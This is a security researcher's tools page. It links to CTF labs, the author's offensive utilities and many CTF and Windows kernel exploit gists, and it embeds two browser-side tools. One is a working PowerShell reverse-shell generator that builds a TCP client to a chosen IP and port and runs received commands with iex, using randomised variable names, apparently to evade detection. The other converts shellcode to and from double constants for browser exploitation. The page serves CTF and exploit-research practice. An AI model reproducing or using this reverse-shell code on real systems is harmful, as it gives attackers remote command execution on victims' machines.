---
# the default layout is 'page'
icon: fas fa-tools
order: 4
---

## Labs

- <https://vulnlab.com>

## Useful

- <https://wiki.vulnlab.com>
- [resh.py](https://gist.github.com/xct/ab71d58a29e9017eb38565e32aeb95b0)

## Shelf

- <https://github.com/xct/winssh>
- <https://github.com/xct/hashgrab>
- <https://github.com/xct/rcat>
- <https://github.com/xct/winpspy>

## Exploits

**Recent**

- [LACTF Rickroll Format String Exploit](https://gist.github.com/xct/0be84416307b66168f050cb9da64c5c4)
- [IdekCTF 2023 Typop (ROP, CSU)](https://gist.github.com/xct/5c4be3073ba76fea3a52d03a84cf0350)
- [Real World CTF 2023 NonHeanvyFTP (Race Condition)](https://gist.github.com/xct/f17488f42d48014a5dcc060714dbec1a)
- [ShaktiCTF 2022 PhrackCrack (Heap – House of Force)](https://gist.github.com/xct/88db526da32d492f3818d15942bbb39b)
- [ShaktiCTF 2022 Ropworks (ROP)](https://gist.github.com/xct/a2547024ea0922398450c71a44692955)
- [GlacierCTF 2022 (Heap – Fastbin Dup)](https://gist.github.com/xct/87ee193e28f66813a9e309cf29a4bc3c)
- [SquareCTF 2022 (Yara / Valgrind)](https://gist.github.com/xct/9b60d9255afe400dd0ce7bb774e613ec)
- [Ekoparty 2022 (Windows, ROP](https://gist.github.com/xct/c4569bd15ad85ea1b5917325b203e15b)
- [MTS HW Driver EOP (Windows, Kernel)](https://gist.github.com/xct/7d192b448793fc6decb4b59c5382bd61)

**Windows Kernel Practice**

- [Null Pointer Dereference Win7 x64 HEVD](https://github.com/xct/windows-kernel-exploits/blob/main/windows-exploits/HevdNullPointerMIWin7x64.cpp)
- [Pool Overflow Win7 x64 HEVD](https://github.com/xct/windows-kernel-exploits/blob/main/windows-exploits/HevdPoolOverflowWin7x64.cpp)
- [Stack Overflow Win10 , GS, Version 2, Version 3 x64 HEVD](https://github.com/xct/windows-kernel-exploits/blob/main/windows-exploits/HevdStackOverflowACLMI.cpp)
- [Type Confusion Win10, Version 2 x64 HEVD](https://github.com/xct/windows-kernel-exploits/blob/main/windows-exploits/HevdTypeConfusionMI.cpp)
- [Use-after-free Win10 x64 HEVD](https://github.com/xct/windows-kernel-exploits/blob/main/windows-exploits/HevdUAFMI.cpp)
- [Arbitrary Read/Write Win10 , Low Integrity, x64 Gigabyte Driver](https://github.com/xct/windows-kernel-exploits/blob/main/windows-exploits/GigabyteDriverMI.cpp)
- [Arbitrary Write Win10 x64 HEVD](https://github.com/xct/windows-kernel-exploits/blob/main/windows-exploits/HevdArbitraryWriteMI.cpp)

**Chrome**

- [StarCTF OOB custom patched Chromium, out-of-bounds access, renderer RCE](https://gist.github.com/xct/795216846c75c625fc10bf10d23982e6)

**Firefox**

- [Midenios custom patched Firefox, out-of-bounds access, renderer RCE](https://gist.github.com/xct/f339058bcb946fb8efd6df00cfb81a0d)

## PowerShell Shell Generator

<div class="container">
    <div class="row">
        <div class="col-md-6">
            <form>
                <div class="form-group">
                    <label for="ip">IP Address</label>
                    <input type="text" class="form-control" id="ip" placeholder="127.0.0.1" />
                </div>
                <div class="form-group">
                    <label for="port">Port</label>
                    <input type="text" class="form-control" id="port" placeholder="443" />
                </div>
                <button type="button" class="btn btn-primary mt-2" onclick="generateCode()">Generate</button>
            </form>
        </div>
    </div>
    <div class="row mt-4" id="outputContainer" style="display: none;">
        <div class="col-12">
            <div id="output" class="p-3 bg-dark text-white rounded" style="white-space: pre-wrap; font-family: monospace;"></div>
        </div>
    </div>
</div>

<script>
    function getRandomVariable() {
        const chars = 'abcdefghijklmnopqrstuvwxyz';
        let varName = '';
        for (let i = 0; i < Math.floor(Math.random() * 5) + 5; i++) {
            varName += chars[Math.floor(Math.random() * chars.length)];
        }
        return varName;
    }

    function generateByteArray(variableName) {
        return `[byte[]]$${variableName} = New-Object byte[] 65535;`;
    }

    function generateCode() {
        const ip = document.getElementById("ip").value;
        const port = document.getElementById("port").value;

        if (!ip || !port) {
            alert("Please enter both IP and port");
            return;
        }

        const varClient = getRandomVariable();
        const varStream = getRandomVariable();
        const varBytes = getRandomVariable();
        const varData = getRandomVariable();
        const varSendback = getRandomVariable();
        const varSendback2 = getRandomVariable();
        const varSendbyte = getRandomVariable();
        const varI = getRandomVariable();
        const varEncoding = Math.random() < 0.5 ? "ASCII" : "UTF8";
        const flushMethod = Math.random() < 0.5 ? "$stream.Flush();" : "[System.Threading.Thread]::Sleep(100);";

        const byteArrayInit = generateByteArray(varBytes);

        const powershellTemplate = `
$${varClient}=New-Object System.Net.Sockets.TCPClient("${ip}",${port});$${varStream}=$${varClient}.GetStream();${byteArrayInit}while(($${varI}=$${varStream}.Read($${varBytes},0,$${varBytes}.Length)) -ne 0){$${varData}=(New-Object -TypeName System.Text.${varEncoding}Encoding).GetString($${varBytes},0,$${varI});$${varSendback}=try{iex $${varData} 2>&1 | Out-String}catch{\$_};$${varSendback2}=$${varSendback}+"[>] ";$${varSendbyte}=([text.encoding]::${varEncoding}).GetBytes($${varSendback2});$${varStream}.Write($${varSendbyte},0,$${varSendbyte}.Length);${flushMethod}};$${varClient}.Close();
        `.replace(/\s+/g, ' ').replace(/\s?;\s?/g, ';').replace(/\s?{\s?/g, '{').trim();

        document.getElementById("output").innerText = powershellTemplate;
        document.getElementById('outputContainer').style.display = 'block';
    }
</script>




## Shellcode Converter

**Shellcode to Double Constants**

<script>
function b2d(byteArr) {
	if(byteArr.length != 8) {
    	alert('Needs to be an 8 bytes long array');
    }
    const bytes = new Uint8Array(byteArr);
    const doubles = new Float64Array(bytes.buffer);
    return doubles[0];
}

function inputToDouble(){
	let input = document.getElementById("inputToDouble").value;
	let parsed = input.split(",");

	let result = [];	
	let i = 0;
	for(token of parsed){
		result.push(parseInt(token, 16));
		i += 1;
	}
	let convs = [];
	const chunkSize = 8;
	for (let i = 0; i < result.length; i += chunkSize) {
	    const chunk = result.slice(i, i + chunkSize);
	    // fill up if < 8
	    for(let j=chunk.length; j<8;j++){
	    	chunk.push(0x90);
	    }
	    convs.push(chunk);
	}
	let outStr = "";
	for(c of convs){
		let conv = b2d(c);
		if(conv)
			outStr += `${conv}\n`
	}
	document.getElementById("inputToDouble").value = outStr;
	return false;
}
</script>

<textarea id="inputToDouble" name="inputToDouble" rows="10" cols="60" placeholder="Example:
0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41.."></textarea>

<form onsubmit="return inputToDouble();" form="jsShellcodeForm">
    <input type="submit" class="btn btn-primary" value="Convert">
</form>


**Double Constants to Shellcode**

<script>
function hexdump(arr){
    function pad(num, size) {
        num = num.toString();
        while (num.length < size) num = "0" + num;
        return num;
    }
    let s = ""
    for(v of arr){
        if(v<0){
            v = v+256;
        }
        s += "0x"+pad(v.toString(16),2)+","
    }    
    return s
}

function inputFromDouble(){
	let input = document.getElementById("inputFromDouble").value;
	let parsed = input.split("\n");
	let doubles = []
	for(token of parsed){
		doubles.push(parseFloat(token));
	}
	let outStr = "";
	for(double of doubles){
		var buffer = new ArrayBuffer(8);     
	    var longNum = new Float64Array(buffer);
	    longNum[0] = double;
	    var byteArr = Array.from(new Int8Array(buffer));
	    outStr += hexdump(byteArr)
	}
	outStr = outStr.substring(0, outStr.length-1);
	document.getElementById("inputFromDouble").value = outStr;
	return false;
}
</script>

<textarea id="inputFromDouble" name="inputFromDouble" rows="10" cols="60" placeholder="Example:
6.867659397734779e+246
7.806615353364766e+184
.."></textarea>

<form onsubmit="return inputFromDouble();" form="jsDoubleForm">
    <input type="submit" class="btn btn-primary" value="Convert">
</form>